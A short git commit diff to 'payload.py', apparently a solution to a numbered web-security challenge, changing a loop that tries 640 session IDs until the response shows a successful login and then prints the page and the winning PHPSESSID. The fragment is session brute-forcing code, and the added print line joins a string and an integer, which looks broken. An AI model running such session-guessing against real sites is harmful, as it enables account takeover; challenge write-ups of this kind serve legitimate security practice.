8e2d1b13c5eeb273c264756778a4ec6558e3c7ad
jesse mailhot <coshmeo@gmail.com>
2022-01-26 13:32:07 -0800

    updated script to show successful PHPSESSID

--- 18/payload.py
+++ 18/payload.py
@@ -10,6 +10,7 @@ for i in range(1, 641): # per source there are 640 session IDs
     if 'next' in r.text: # the word next only appears in the response when you've successfully logged in
         
         soup = BeautifulSoup(r.text, 'html.parser')
-        print(soup.get_text())
+        print(soup.find(id='content'))
+        print('PHPSESSID: '+i) # we need this for the next challenge
 
         break
